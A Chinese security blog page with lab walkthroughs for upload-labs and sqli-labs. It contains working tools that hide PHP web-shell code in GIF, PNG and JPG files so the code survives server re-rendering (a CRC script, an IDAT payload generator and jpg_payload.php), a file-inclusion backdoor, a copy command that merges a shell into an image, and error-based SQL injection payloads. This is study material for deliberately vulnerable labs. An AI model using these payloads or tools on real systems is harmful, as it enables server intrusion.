-<p>可以看到下载下来的文件名已经变化,所以这是经过二次渲染的图片.我们使用16进制编辑器将其打开.<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084054-301ef28c-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084054-301ef28c-ab24-1.png" alt="img"></a></p>
-<p>可以发现,我们在gif末端添加的php代码已经被去除.</p>
-<p>关于绕过gif的二次渲染,我们只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片了.</p>
-<p>经过对比,蓝色部分是没有发生变化的,<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-3034afe6-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-3034afe6-ab24-1.png" alt="img"></a></p>
-<p>我们将代码写到该位置.<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30462ed8-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30462ed8-ab24-1.png" alt="img"></a></p>
-<p>上传后在下载到本地使用16进制编辑器打开<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-3059bb06-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-3059bb06-ab24-1.png" alt="img"></a></p>
-<p>可以看到php代码没有被去除.成功上传图片马</p>
-<h2 id="上传png"><a href="#上传png" class="headerlink" title="上传png"></a>上传png</h2><p>png的二次渲染的绕过并不能像gif那样简单.</p>
-<h3 id="png文件组成"><a href="#png文件组成" class="headerlink" title="png文件组成"></a>png文件组成</h3><p>png图片由3个以上的数据块组成.</p>
-<p>PNG定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，这是标准的数据块，另一种叫做辅助数据块(ancillary chunks)，这是可选的数据块。关键数据块定义了3个标准数据块(IHDR,IDAT, IEND)，每个PNG文件都必须包含它们.</p>
-<p>数据块结构<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-3065c234-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-3065c234-ab24-1.png" alt="img"></a></p>
-<p>CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的。CRC具体算法定义在ISO 3309和ITU-T V.42中，其值按下面的CRC码生成多项式进行计算：</p>
-<p>x32+x26+x23+x22+x16+x12+x11+x10+x8+x7+x5+x4+x2+x+1</p>
-<h3 id="分析数据块"><a href="#分析数据块" class="headerlink" title="分析数据块"></a>分析数据块</h3><h4 id="IHDR"><a href="#IHDR" class="headerlink" title="IHDR"></a>IHDR</h4><p>数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</p>
-<p>文件头数据块由13字节组成，它的格式如下图所示。<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30748058-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30748058-ab24-1.png" alt="img"></a></p>
-<h4 id="PLTE"><a href="#PLTE" class="headerlink" title="PLTE"></a>PLTE</h4><p>调色板PLTE数据块是辅助数据块,对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致PNG图像不合法。</p>
-<h4 id="IDAT"><a href="#IDAT" class="headerlink" title="IDAT"></a>IDAT</h4><p>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</p>
-<p>IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像</p>
-<h4 id="IEND"><a href="#IEND" class="headerlink" title="IEND"></a>IEND</h4><p>图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</p>
-<p>如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：</p>
-<p>00 00 00 00 49 45 4E 44 AE 42 60 82</p>
-<h3 id="写入php代码"><a href="#写入php代码" class="headerlink" title="写入php代码"></a>写入php代码</h3><p>在网上找到了两种方式来制作绕过二次渲染的png木马.</p>
-<h4 id="写入PLTE数据块"><a href="#写入PLTE数据块" class="headerlink" title="写入PLTE数据块"></a>写入PLTE数据块</h4><p>php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以再chunk data域插入php代码,然后重新计算相应的crc值并修改即可.</p>
-<p>这种方式只针对索引彩色图像的png图片才有效,在选取png图片时可根据IHDR数据块的color type辨别.<code>03</code>为索引彩色图像.</p>
-<ol>
-<li>在PLTE数据块写入php代码.<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30847062-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30847062-ab24-1.png" alt="img"></a></li>
-<li>计算PLTE数据块的CRC<br>CRC脚本</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">png = open(r&#x27;2.png&#x27;,&#x27;rb&#x27;)</span><br><span class="line">a = png.read()</span><br><span class="line">png.close()</span><br><span class="line">hexstr = binascii.b2a_hex(a)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27; PLTE crc &#x27;&#x27;&#x27;</span><br><span class="line">data =  &#x27;504c5445&#x27;+ re.findall(&#x27;504c5445(.*?)49444154&#x27;,hexstr)[0]</span><br><span class="line">crc = binascii.crc32(data[:-16].decode(&#x27;hex&#x27;)) &amp; 0xffffffff</span><br><span class="line">print hex(crc)</span><br></pre></td></tr></table></figure>
-
-<p>运行结果</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">526579b0</span><br></pre></td></tr></table></figure>
-
-<p>3.修改CRC值</p>
-<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30948bfa-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30948bfa-ab24-1.png" alt="img"></a></p>
-<p>4.验证<br>将修改后的png图片上传后,下载到本地打开<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30a39e2e-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30a39e2e-ab24-1.png" alt="img"></a></p>
-<h4 id="写入IDAT数据块"><a href="#写入IDAT数据块" class="headerlink" title="写入IDAT数据块"></a>写入IDAT数据块</h4><p>这里有国外大牛写的脚本,直接拿来运行即可.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class="line">           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class="line">           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class="line">           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class="line">           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class="line">           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class="line">           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class="line">           0x66, 0x44, 0x50, 0x33);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(32, 32);</span><br><span class="line"></span><br><span class="line">for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+1];</span><br><span class="line">   $b = $p[$y+2];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / 3), 0, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,&#x27;./1.png&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>运行后得到1.png.上传后下载到本地打开如下图</p>
-<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30b19aec-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30b19aec-ab24-1.png" alt="img"></a></p>
-<h2 id="上传jpg"><a href="#上传jpg" class="headerlink" title="上传jpg"></a>上传jpg</h2><p>这里也采用国外大牛编写的脚本jpg_payload.php.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    /*</span><br><span class="line"></span><br><span class="line">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="line">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="line"></span><br><span class="line">    1) Upload an arbitrary image via secured files upload script</span><br><span class="line">    2) Save the processed image and launch:</span><br><span class="line">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="line"></span><br><span class="line">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="line"></span><br><span class="line">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="line">    1) After the second processing the injected data may become partially corrupted.</span><br><span class="line">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br><span class="line">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="line"></span><br><span class="line">    Sergey Bobrov @Black2Fan.</span><br><span class="line"></span><br><span class="line">    See also:</span><br><span class="line">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="line"></span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123;</span><br><span class="line">        die(&#x27;php-gd is not installed&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!isset($argv[1])) &#123;</span><br><span class="line">        die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(&quot;custom_error_handler&quot;);</span><br><span class="line"></span><br><span class="line">    for($pad = 0; $pad &lt; 1024; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = new DataInputStream($argv[1]);</span><br><span class="line">        $outStream = file_get_contents($argv[1]);</span><br><span class="line">        $extraBytes = 0;</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line"></span><br><span class="line">        if($dis-&gt;readShort() != 0xFFD8) &#123;</span><br><span class="line">            die(&#x27;Incorrect SOI marker&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - 2;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            if($marker === 0xDA) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, 0, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE);</span><br><span class="line">                if($extraBytes !== 0) &#123;</span><br><span class="line">                    while((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        if($dis-&gt;readByte() === 0xFF) &#123;</span><br><span class="line">                            if($dis-&gt;readByte !== 0x00) &#123;</span><br><span class="line">                                break;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - 2;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, 0, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            0,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; elseif($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123;</span><br><span class="line">                    die(&#x27;Success!&#x27;);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(&#x27;payload_&#x27;.$argv[1]);</span><br><span class="line">    die(&#x27;Something\&#x27;s wrong&#x27;);</span><br><span class="line"></span><br><span class="line">    function checkImage($filename, $data, $unlink = FALSE) &#123;</span><br><span class="line">        global $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        if($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        return $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;</span><br><span class="line">        global $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = FALSE;</span><br><span class="line">        if(preg_match(&#x27;/(\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123;</span><br><span class="line">            if(isset($m[1])) &#123;</span><br><span class="line">                $extraBytes = (int)$m[1];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class DataInputStream &#123;</span><br><span class="line">        private $binData;</span><br><span class="line">        private $order;</span><br><span class="line">        private $size;</span><br><span class="line"></span><br><span class="line">        public function __construct($filename, $order = false, $fromString = false) &#123;</span><br><span class="line">            $this-&gt;binData = &#x27;&#x27;;</span><br><span class="line">            $this-&gt;order = $order;</span><br><span class="line">            if(!$fromString) &#123;</span><br><span class="line">                if(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;);</span><br><span class="line">                $this-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $this-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            $this-&gt;size = strlen($this-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function seek() &#123;</span><br><span class="line">            return ($this-&gt;size - strlen($this-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function skip($skip) &#123;</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readByte() &#123;</span><br><span class="line">            if($this-&gt;eof()) &#123;</span><br><span class="line">                die(&#x27;End Of File&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr($this-&gt;binData, 0, 1);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 1);</span><br><span class="line">            return ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readShort() &#123;</span><br><span class="line">            if(strlen($this-&gt;binData) &lt; 2) &#123;</span><br><span class="line">                die(&#x27;End Of File&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr($this-&gt;binData, 0, 2);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 2);</span><br><span class="line">            if($this-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);</span><br><span class="line">            &#125;</span><br><span class="line">            return $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function eof() &#123;</span><br><span class="line">            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>使用方法</p>
-<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>随便找一个jpg图片,先上传至服务器然后再下载到本地保存为<code>1.jpg</code>.</p>
-<h3 id="插入php代码"><a href="#插入php代码" class="headerlink" title="插入php代码"></a>插入php代码</h3><p>使用脚本处理<code>1.jpg</code>,命令<code>php jpg_payload.php 1.jpg</code><br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30bb4236-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30bb4236-ab24-1.png" alt="img"></a><br>使用16进制编辑器打开,就可以看到插入的php代码.<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30c860b0-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30c860b0-ab24-1.png" alt="img"></a></p>
-<h3 id="上传图片马"><a href="#上传图片马" class="headerlink" title="上传图片马"></a>上传图片马</h3><p>将生成的<code>payload_1.jpg</code>上传.<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30d3a1a0-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30d3a1a0-ab24-1.png" alt="img"></a></p>
-<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>将上传的图片再次下载到本地,使用16进制编辑器打开<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30e17b68-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30e17b68-ab24-1.png" alt="img"></a></p>
-<p>可以看到,php代码没有被去除.<br>证明我们成功上传了含有php代码的图片.</p>
-<p>需要注意的是,有一些jpg图片不能被处理,所以要多尝试一些jpg图片.</p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/notice">https://xz.aliyun.com/notice</a>)</p>
-<p>转载自<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657#toc-7">https://xz.aliyun.com/t/2657#toc-7</a>  实在是看不懂之后再研究一下</p>
-<p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1mkiyUkiwLtPN9_y_sPGXBA">https://pan.baidu.com/s/1mkiyUkiwLtPN9_y_sPGXBA</a> 提取码：aaaa</p>
-<p><strong>其实这关就是要绕过二次渲染 然后用十六进制编辑器编辑一下</strong></p>
-<p><strong>先找一下上传到服务器上的图片和本地图片不变的代码是那一部分然后就可以把后门代码编辑进去就可成功上传</strong></p>
-<p><strong>链接里的文件是大佬 o(<em>^▽^</em>)┛已经制作好了的图片可以直接使用</strong></p>
-<p><strong>然后配合漏洞菜刀使用即可</strong></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/03/01/page-33/" data-id="ckrosnluc000lmow711751uas" data-title="十六看懂了" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-32" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/03/01/page-32/" class="article-date">
-  <time class="dt-published" datetime="2021-03-01T10:14:42.000Z" itemprop="datePublished">2021-03-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/03/01/page-32/">uplolalabs&#39;13 14 15</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><strong>第十三关   需要上传一个图片马</strong> 但是呢要图片马可以使用必须得服务器先能解析图片马 </p>
-<p>那么就得先上传一个简单的漏洞aaa.php    这个是漏洞代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这个代码的意思是需要引用其他的应用程序然后它也不管是什么全当成php来解析</p>
-<p>然后需要往一个jpg里面嵌入后门代码 放图片和代码的位置cmd</p>
-<p>copy 1.jpg/b + 1.php/a 2.jpg 合并后会生成一个2.jpg 或者也可以直接嵌入1.jpg 这个/b 指定以二进制格式复制 /a指定以ASCII格式复制 图片不能用ascii复制不然到时候生成的图片打不开</p>
-<p>然后上传上去会被改名字burp可以看见被改后的名字 和储存的路径<img src="https://img.kanzhun.com/images/seo/mianshiti/20191125/160089f90c50a936fb1cb0694380bce5.jpg" alt="在这里插入图片描述"></p>
-<p>然后就是用菜刀连接一下了 </p>
-<p><a target="_blank" rel="noopener" href="http://127.0.0.1/upload-labs/aaa.php?file=upload/4320181108192653.png">http://127.0.0.1/upload-labs/aaa.php?file=upload/4320181108192653.png</a> 就还挺快的除了需要解析这一步</p>
-<p><strong>十四关</strong> 和十三差不多只是检测不一样 十三检测开头两个字节就是图片以记事本打开后的前三行可以只保留前三行然后其余全部删掉换成后门文件 </p>
-<p>十四没法这么干好像 这个是getimagesize检查那就只能用那个cmd的嵌入法 其余和十三一样了</p>
-<p><strong>十五</strong>  和前面差不多换成exif_imagetype的检查函数</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/03/01/page-32/" data-id="ckrosnluc000kmow775ktekba" data-title="uplolalabs&#39;13 14 15" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-30" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/02/18/page-30/" class="article-date">
-  <time class="dt-published" datetime="2021-02-18T09:50:50.000Z" itemprop="datePublished">2021-02-18</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/02/18/page-30/">sqlilabs 50 51 52 53 54 55 56 57 58-65</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>50 51 这两关是堆叠注入没什么差别好像除了51有个单引号</p>
-<p>52 53 又关闭了报错 然后堆叠也可以弄一弄 用sqlmap 直接解决</p>
-<p>54 单引号 55括号 56 ‘) 57”  54-57这几关有次数限制 然后和之前用union select 的一样就获取数据的</p>
-<p>要获取的是secret_（后面这串是随机的） 这个列里头的数据 获取玩提交一下就可以了</p>
-<p>58 先随便试一试 存在报错信息  而且union select的没有回显只好用报错了</p>
-<p>?id=0’ and updatexml(1,(select concat(1,(select table_name from information_schema.tables where table_schema=’challenges))),1) –+   查表</p>
-<p>?id=0’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’mz8xr9yz2a’),0x7e),1)–+ 查列</p>
-<p>?id=0’ and updatexml(1,concat(0x7e,(select secret_VP4R from challenges.mz8xr9yz2a),0x7e),1) –+ 查到数据提交就ok了</p>
-<p>59数字型?id=0 其余同上一关</p>
-<p>60 ?id=0”) 61 ?id=0’)) </p>
-<p>62关了报错 但是存在明显延迟时间盲注 那就用sqlmap吧  62手动注入’)</p>
-<p>63 手动注入的话单引号闭合</p>
-<p>64 俩括号 </p>
-<p>65双引号加个括号 这几关都是时间盲注 用sqlmap吧 </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/18/page-30/" data-id="ckrosnlub000jmow7a99jdmsx" data-title="sqlilabs 50 51 52 53 54 55 56 57 58-65" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
